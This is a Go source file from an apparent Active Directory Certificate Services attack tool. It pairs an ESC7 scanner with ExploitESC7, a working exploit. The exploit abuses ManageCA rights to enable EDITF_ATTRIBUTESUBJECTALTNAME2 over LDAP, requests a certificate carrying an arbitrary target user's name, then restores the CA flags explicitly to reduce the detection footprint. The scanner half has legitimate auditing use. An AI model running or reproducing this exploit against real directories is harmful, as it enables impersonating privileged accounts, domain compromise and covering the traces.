package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"

	"github.com/go-ldap/ldap/v3"
)

// manageCAMask is the access mask bit for the ManageCA (CA Administrator) right
// on a CA object. Holders can modify CA configuration including enabling
// EDITF_ATTRIBUTESUBJECTALTNAME2.
const manageCAMask uint32 = 0x00000001

// manageCertificatesMask is the access mask bit for the ManageCertificates
// (Certificate Manager / CA Officer) right. Holders can approve pending
// certificate requests and revoke issued certificates.
const manageCertificatesMask uint32 = 0x00000002

// ESC7Finding represents a CA where non-privileged users hold ManageCA or
// ManageCertificates rights — the ESC7 attack primitive. ManageCA allows
// enabling EDITF_ATTRIBUTESUBJECTALTNAME2, which turns the CA into an ESC6
// target. ManageCertificates allows approving pending certificate requests.
type ESC7Finding struct {
	CAName             string `json:"ca_name"`
	CADN               string `json:"ca_dn"`
	ManageCA           bool   `json:"manage_ca"`
	ManageCertificates bool   `json:"manage_certificates"`
	Trustee            string `json:"trustee"`
	AccessMask         uint32 `json:"access_mask"`
}

// ScanESC7 detects ESC7 — CA objects where non-privileged users hold ManageCA
// or ManageCertificates rights. ManageCA allows the attacker to enable
// EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (converting it to ESC6), and
// ManageCertificates allows approving pending certificate requests.
//
// This reuses the EnumerateCAs function and security descriptor parsing from
// ESC5, but specifically looks for ManageCA/ManageCertificates access mask bits
// rather than the generic dangerous write rights.
func ScanESC7(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC7Finding, error) {
	fmt.Println("[*] Scanning for ESC7 (ManageCA/ManageCertificates abuse)...")

	// Step 1: Enumerate CA objects with their security descriptors
	cas, err := EnumerateCAs(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate CAs: %w", err)
	}

	// Step 2: Parse each CA's security descriptor for ManageCA/ManageCertificates ACEs
	var all []ESC7Finding
	for _, ca := range cas {
		findings, err := checkESC7(ca.Name, ca.DN, ca.SecurityDescriptor)
		if err != nil {
			fmt.Printf("[!] ESC7 parse error for %s: %v\n", ca.Name, err)
			continue
		}
		if len(findings) > 0 {
			fmt.Printf("[!] ESC7 VULNERABLE: %s — %d dangerous ACE(s)\n", ca.Name, len(findings))
		}
		all = append(all, findings...)
	}

	if len(all) == 0 {
		fmt.Println("[*] No ESC7 findings — no non-privileged ManageCA/ManageCertificates rights detected.")
	} else {
		fmt.Printf("[!] ESC7: %d finding(s) detected\n", len(all))
	}

	return all, nil
}

// checkESC7 parses the nTSecurityDescriptor of a CA object and returns ESC7
// findings where non-privileged trustees hold ManageCA or ManageCertificates
// rights. These rights allow CA configuration changes and certificate approval
// that can be chained into full domain compromise.
func checkESC7(caName, caDN string, rawSD []byte) ([]ESC7Finding, error) {
	if len(rawSD) == 0 {
		return nil, nil
	}

	sd, err := ParseSecurityDescriptor(rawSD)
	if err != nil {
		return nil, fmt.Errorf("parse SD for %s: %w", caName, err)
	}

	if sd.DACL == nil {
		return nil, nil
	}

	var findings []ESC7Finding
	for _, ace := range sd.DACL.ACEs {
		// Only care about allow ACEs
		if ace.Type != aceTypeAccessAllowed {
			continue
		}
		if ace.SIDText == "" {
			continue
		}
		// Skip privileged trustees — they are expected to have these rights
		if isPrivilegedSID(ace.SIDText) {
			continue
		}

		hasManageCA := ace.Mask&manageCAMask != 0
		hasManageCerts := ace.Mask&manageCertificatesMask != 0

		// Also flag GenericAll since it implies both ManageCA and ManageCertificates
		if ace.Mask&accessGenericAll != 0 {
			hasManageCA = true
			hasManageCerts = true
		}

		if !hasManageCA && !hasManageCerts {
			continue
		}

		finding := ESC7Finding{
			CAName:             caName,
			CADN:               caDN,
			ManageCA:           hasManageCA,
			ManageCertificates: hasManageCerts,
			Trustee:            ace.SIDText,
			AccessMask:         ace.Mask,
		}
		findings = append(findings, finding)

		var rights []string
		if hasManageCA {
			rights = append(rights, "ManageCA")
		}
		if hasManageCerts {
			rights = append(rights, "ManageCertificates")
		}
		fmt.Printf("[!] ESC7: CA %q — trustee %s has %v\n", caName, ace.SIDText, rights)
	}

	return findings, nil
}

// ExploitESC7 exploits ManageCA rights on a CA to enable EDITF_ATTRIBUTESUBJECTALTNAME2,
// then exploits the now-ESC6-vulnerable CA to forge a certificate with an arbitrary SAN.
// After exploitation, the original CA configuration is restored.
//
// Attack flow:
//  1. Connect via LDAP and locate the CA's enrollment service object
//  2. Save original flags, then enable EDITF_ATTRIBUTESUBJECTALTNAME2
//  3. Exploit as ESC6 — request a certificate with the target UPN in the SAN
//  4. Restore the original CA flags to reduce detection footprint
func ExploitESC7(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, caName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC7 Exploitation: ca=%s target=%s\n", caName, targetUPN)

	// Step 1: Verify the CA is ESC7-exploitable
	findings, err := ScanESC7(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC7 scan: %w", err)
	}

	var matchedFinding *ESC7Finding
	for i, f := range findings {
		if f.CAName == caName && f.ManageCA {
			matchedFinding = &findings[i]
			break
		}
	}
	if matchedFinding == nil {
		return nil, nil, fmt.Errorf("CA %q has no ESC7 finding with ManageCA rights", caName)
	}

	fmt.Printf("[+] CA %q confirmed ESC7 vulnerable (ManageCA held by %s)\n", caName, matchedFinding.Trustee)

	// Step 2: Connect via LDAP to modify the CA's enrollment service object
	// Find the enrollment service object for this CA
	baseDN := buildEnrollmentServicesBaseDN(cfg.Domain)
	filter := fmt.Sprintf("(&(objectClass=pKIEnrollmentService)(cn=%s))", ldap.EscapeFilter(caName))

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter,
		[]string{"distinguishedName", "flags", "certificateTemplates"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return nil, nil, fmt.Errorf("enrollment service %q not found: %w", caName, err)
	}

	serviceDN := result.Entries[0].DN
	fmt.Printf("[+] Found enrollment service DN: %s\n", serviceDN)

	// Save original flags before modification
	originalFlags := result.Entries[0].GetAttributeValue("flags")
	if originalFlags == "" {
		originalFlags = "0"
	}
	fmt.Printf("[*] Original CA flags: %s\n", originalFlags)

	// Step 3: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA
	// This flag (0x00040000) allows requesters to specify arbitrary SANs,
	// effectively converting the CA into an ESC6 target.
	var flagsVal uint32
	if _, err := fmt.Sscanf(originalFlags, "%d", &flagsVal); err != nil {
		// flags may be stored as binary in some AD implementations — try parsing as uint32 directly
		if _, parseErr := fmt.Sscanf(originalFlags, "%d", &flagsVal); parseErr != nil {
			fmt.Printf("[!] Warning: could not parse CA flags %q as decimal, assuming 0: %v\n", originalFlags, err)
			flagsVal = 0
		}
	}
	flagsVal |= 0x00040000 // EDITF_ATTRIBUTESUBJECTALTNAME2
	newFlags := fmt.Sprintf("%d", flagsVal)

	fmt.Println("[*] Enabling EDITF_ATTRIBUTESUBJECTALTNAME2 on CA...")
	modReq := ldap.NewModifyRequest(serviceDN, nil)
	modReq.Replace("flags", []string{newFlags})
	if err := conn.Modify(modReq); err != nil {
		return nil, nil, fmt.Errorf("modify CA flags (need ManageCA): %w", err)
	}
	fmt.Printf("[+] CA flags modified: %s -> %s (EDITF_ATTRIBUTESUBJECTALTNAME2 enabled)\n", originalFlags, newFlags)

	// Step 4: Exploit as ESC6 — enroll for a certificate with the target UPN injected
	// via request attributes. With EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, any
	// template can be abused to request a certificate with an arbitrary SAN.
	// Use the "User" template as a default — it's present on all AD CS deployments
	// and has Client Authentication EKU.
	enrollTemplate := selectEnrollmentTemplate(cfg, conn, result.Entries[0].GetAttributeValues("certificateTemplates"))
	fmt.Printf("[*] Exploiting CA as ESC6 (arbitrary SAN enabled) using template %q...\n", enrollTemplate)
	cert, certKey, err := EnrollCertificate(cfg, enrollTemplate, targetUPN, true)
	if err != nil {
		// Restore before returning
		restoreReq := ldap.NewModifyRequest(serviceDN, nil)
		restoreReq.Replace("flags", []string{originalFlags})
		conn.Modify(restoreReq)
		return nil, nil, fmt.Errorf("enrollment via ESC6 failed: %w", err)
	}

	fmt.Printf("[+] Certificate obtained for %s via ESC7->ESC6 on CA %q\n", targetUPN, caName)

	// Step 5: Restore original CA configuration
	fmt.Println("[*] Restoring original CA configuration...")
	restoreReq := ldap.NewModifyRequest(serviceDN, nil)
	restoreReq.Replace("flags", []string{originalFlags})
	if err := conn.Modify(restoreReq); err != nil {
		fmt.Printf("[!] Warning: failed to restore CA flags: %v\n", err)
		fmt.Printf("[!] Manual restoration needed: certutil -config \"%s\" -setreg policy\\EditFlags %s\n", caName, originalFlags)
	} else {
		fmt.Printf("[+] CA flags restored to original value: %s\n", originalFlags)
	}

	fmt.Printf("[+] ESC7 exploitation successful — ManageCA -> ESC6 -> forged cert\n")
	return cert, certKey, nil
}

func selectEnrollmentTemplate(cfg *ADCSConfig, conn *ldap.Conn, caTemplates []string) string {
	if len(caTemplates) == 0 {
		return "User"
	}
	allTemplates, err := EnumerateTemplates(context.Background(), cfg, conn)
	if err != nil {
		return caTemplates[0]
	}
	tmplMap := make(map[string]*CertTemplate, len(allTemplates))
	for i := range allTemplates {
		tmplMap[allTemplates[i].Name] = &allTemplates[i]
	}
	for _, name := range caTemplates {
		t, ok := tmplMap[name]
		if !ok {
			continue
		}
		if !t.RequiresManagerApproval && t.AuthenticationEKU && t.AuthorizedSignatures == 0 {
			return name
		}
	}
	for _, name := range caTemplates {
		t, ok := tmplMap[name]
		if !ok {
			continue
		}
		if !t.RequiresManagerApproval {
			return name
		}
	}
	return caTemplates[0]
}
